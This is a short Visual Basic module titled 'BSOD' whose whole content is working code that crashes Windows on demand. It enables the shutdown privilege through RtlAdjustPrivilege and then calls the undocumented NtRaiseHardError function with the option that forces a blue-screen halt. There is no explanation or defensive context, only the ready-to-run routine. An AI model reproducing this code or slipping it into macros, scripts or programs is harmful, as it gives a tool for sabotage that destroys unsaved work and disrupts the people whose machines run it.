Attribute VB_Name = "BSOD"

Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (ByVal Privilege As Long, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, ByRef previousValue As Long) As Long
Private Declare Function NtRaiseHardError Lib "ntdll.dll" (ByVal ErrorStatus As Long, ByVal NumberOfParameters As Long, ByVal UnicodeStringParameterMask As Long, ByVal Parameters As Long, ByVal ValidResponseOption As Long, ByRef Response As Long) As Long
Private Declare Function RtlNtStatusToDosError Lib "ntdll.dll" (ByVal error_code as Long) As Long
Public Sub RaiseError()
    Dim previousValue As Long
    RtlAdjustPrivilege 19, True, False, previousValue
    NtRaiseHardError RtlNtStatusToDosError(&HDEADDEAD), 0&, 0&, 0&, 6&, Response&
End Sub


